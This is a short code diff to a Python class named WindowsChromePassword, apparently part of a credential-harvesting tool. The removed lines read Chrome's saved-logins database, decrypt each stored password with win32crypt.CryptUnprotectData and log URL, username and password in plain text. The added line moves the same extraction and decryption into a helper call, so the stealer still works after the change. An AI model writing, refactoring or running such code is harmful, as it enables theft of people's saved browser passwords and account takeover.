@@ -29,14 +29,6 @@ class WindowsChromePassword(ChromeModule):
 			if os.path.isfile(password_path):
 				connection = sqlite3.connect(password_path)
 				cursor = connection.cursor()
-				try:
-					cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-				except sqlite3.OperationalError:
-					self.executenot(password_path + ' database is locked', 1)
-					return False
-
-				self.log('url,username,password')
-				for url, username, password in cursor.fetchall():
-					self.log(url + ',' + username + ',' + (win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]).decode('utf-8'))
+				self.cursor_get_and_log(cursor, 'action_url, username_value, password_value', 'logins', decrypt_ids=[2])
 
 		return True
